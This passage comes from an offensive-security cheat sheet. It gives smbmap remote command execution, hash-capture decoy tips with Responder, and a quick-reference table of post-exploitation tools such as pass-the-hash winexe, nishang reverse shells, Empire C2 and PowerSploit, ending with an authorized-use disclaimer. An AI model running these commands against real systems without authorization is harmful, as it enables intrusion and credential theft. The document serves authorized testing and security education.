smbmap -H <ip> -u <user> -p <password> -x 'whoami'
```

**Practical tips**:
- Finding a share with WRITE rights is the key: drop .scf/.lnk decoys there and pair them with Responder to capture hashes
- Bulk runs on large domains: walk the CIDR IP by IP; pass `-d <domain>` to avoid local-account ambiguity
- Compared with `nxc smb --shares`, smbmap can drill straight down into file contents

## Remaining Tools — Quick Reference

| Tool | One-line Purpose | Package | Most Common Command |
|---|---|---|---|
| azurehound | BloodHound data collector for Azure | azurehound | `azurehound start --tenant <tenant_id> --client-id <app_id> --client-secret <secret>` |
| evil-winrm-py | WinRM shell implemented in Python (supports NTLM/PTH/certificate/Kerberos) | evil-winrm-py | `evil-winrm-py -i <ip> -u <user> -p <password>` |
| nishang | PowerShell attack script collection (reverse shells, privilege escalation, information gathering) | nishang | `ls /usr/share/nishang/` (load via `evil-winrm -s`, then call Invoke-*) |
| passing-the-hash | Hash-authentication builds of curl/winexe/samba etc. with the pth- prefix | passing-the-hash | `pth-winexe -U '<domain>/<user>%<lm_hash>:<nt_hash>' //<ip> cmd` |
| powershell-empire | PowerShell/Python C2 and post-exploitation framework | powershell-empire | `powershell-empire server` / `powershell-empire client` |
| powersploit | PowerShell post-exploitation module collection (Inject/Mimikatz/Recon) | powersploit | `ls /usr/share/powersploit/` (downloaded and loaded via IEX on the target) |
| pwsh | Cross-platform PowerShell for generating/testing PS payloads locally and for AMSI research | powershell | `pwsh -nop -enc <base64_utf16le_command>` |
| rdesktop | Traditional RDP client (unmaintained, fallback only) | rdesktop | `rdesktop -u <user> -p <password> <ip>:3389` |
| xfreerdp3 | FreeRDP3 RDP client (actively maintained, supports gateway/dynamic resolution) | freerdp3-x11 | `xfreerdp3 /v:<ip> /u:<domain>\\<user> /p:<password> /dynamic-resolution +clipboard` |

> This file is for penetration testing with written authorization, CTF competitions, and security education scenarios only.
